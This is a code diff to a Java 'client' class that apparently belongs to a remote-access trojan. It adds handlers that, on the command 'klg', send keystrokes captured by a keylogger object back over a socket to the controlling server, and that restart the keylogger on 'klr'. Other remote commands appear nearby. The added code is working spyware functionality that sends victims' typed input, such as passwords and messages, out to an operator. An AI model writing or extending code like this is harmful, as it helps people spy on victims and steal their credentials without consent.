@@ -1,5 +1,6 @@
 import java.net.*;
 import java.io.*;
+import java.util.*;
 public class client {
     Socket sock;    
     PrintStream ps;
@@ -74,10 +75,16 @@ public class client {
                         sh=true;
                     }    
                     if (line.equals("klg")) {
-                        
+                        ps.println("ok");
+                        ArrayList<String> presses = kl.retrieve();
+                        for(String s : presses) {
+                            ps.println(s);
+                        }
+                        ps.println("{}{}{}");
                     }
                     if (line.equals("klr")) {
-                        
+                        kl.restart();
+                        ps.println("c");
                     }
                     if (line.equals("ap99")) {
                         int seconds = Integer.parseInt(din.readLine());
